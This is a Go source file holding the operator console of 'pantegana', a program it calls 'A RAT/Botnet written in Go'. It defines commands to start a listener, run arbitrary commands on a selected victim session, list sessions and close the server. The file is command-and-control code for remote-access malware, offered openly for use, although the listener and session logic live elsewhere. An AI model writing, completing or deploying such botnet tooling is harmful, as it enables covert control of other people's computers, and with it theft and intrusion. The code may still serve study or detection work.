package server

import (
	"encoding/json"
	"errors"
	"fmt"

	"github.com/desertbit/grumble"
)

var cli = grumble.New(&grumble.Config{
	Name:        "pantegana",
	Description: "A RAT/Botnet written in Go",

	Flags: func(f *grumble.Flags) {
		f.String("d", "directory", "DEFAULT", "set an alternative directory path")
		f.Bool("v", "verbose", false, "enable verbose mode")
	},
})

func init() {
	cli.AddCommand(&grumble.Command{
		Name: "listen",
		Help: "runs the listener",

		Flags: func(f *grumble.Flags) {
			f.Int("p", "port", 1337, "The port to listen (443 needs root but reccomend)")
			f.BoolL("notls", false, "Set to remove encryption. Use mostly in testing.")
		},

		Args: func(a *grumble.Args) {
			a.String("host", "a host to listen to (use either a domain or ip)", grumble.Default("localhost"))
		},

		Run: func(c *grumble.Context) error {
			go StartListener(c.Args.String("host"), c.Flags.Int("port"), c.Flags.Bool("notls"))
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name: "exec",
		Help: "executes a command to a session",

		Flags: func(f *grumble.Flags) {
			f.Int("s", "session", -1, " * The sesssion to execute the command to.")
		},

		Args: func(a *grumble.Args) {
			a.String("cmd", "command to execute")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.Int("session") == -1 {
				return errors.New("Please define a session with -s")
			}
			session := c.Flags.Int("session")

			go func() {
				err := Sessions[session].WriteToCmd(c.Args.String("cmd"))
				if err != nil {
					cli.PrintError(err)
				}
			}()

			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name: "close",
		Help: "closes the listener",

		Run: func(c *grumble.Context) error {
			err := CloseServer()
			if err != nil {
				return err
			}
			cli.Println("[+] Listener successfully closed")
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name: "sessions",
		Help: "Lists the sessions",

		// TODO: make this fancy
		Run: func(c *grumble.Context) error {
			b, err := json.MarshalIndent(Sessions, "", "  ")
			if err == nil {
				fmt.Println(string(b))
			}
			return err
		},
	})

}
